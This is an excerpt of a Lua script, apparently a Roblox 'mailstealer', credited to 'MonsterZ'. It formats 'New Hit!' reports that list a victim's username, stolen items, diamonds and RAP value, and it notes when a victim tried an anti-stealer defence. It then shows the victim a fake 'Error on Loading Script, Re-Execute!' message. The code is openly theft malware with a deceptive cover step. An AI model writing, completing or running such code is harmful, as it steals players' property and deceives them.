...
local MailMessage = "MonsterZ on TOP!"
...
local function SendMessage(username, diamonds)
    ...
    local fields = {
        {
            name = "**(\240\159\164\161) > Username:**",
            value = "```" .. username .. "```",
            inline = false
        },
        {
            name = "**(\240\159\152\186) > Creator:**",
            value = "```" .. Username .. "\n" .. Username2 .. "```",
            inline = false
        },
        {
            name = "**(\240\159\146\176) > HIT List:**",
            value = "",
            inline = false
        },
        {
            name = "**(\240\159\146\142) > Diamonds:**",
            value = "```" .. formatNumber(diamonds) .. "```",
            inline = true
        },
        {
            name = "**(\240\159\164\145) > Amount RAP:**",
    ...
    for _, itemName in ipairs(combinedItems) do
        local itemInfo = itemRapMap[itemName]
        fields[3].value = fields[3].value .. "``" .. itemName .. " x" .. itemInfo.amount .. "``\n"
    end

    if getFucked then
        fields[3].value = fields[3].value .. "\n\nPlayer Tried to Use Anti-Mailstealer!"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "**\240\159\154\128 Yay! New Hit!**",
            ["color"] = 0,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Custom By MonsterZ!"
            }
        }}
    }
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    message.Error("Oops! Error on Loading Script, Re-Execute!")
end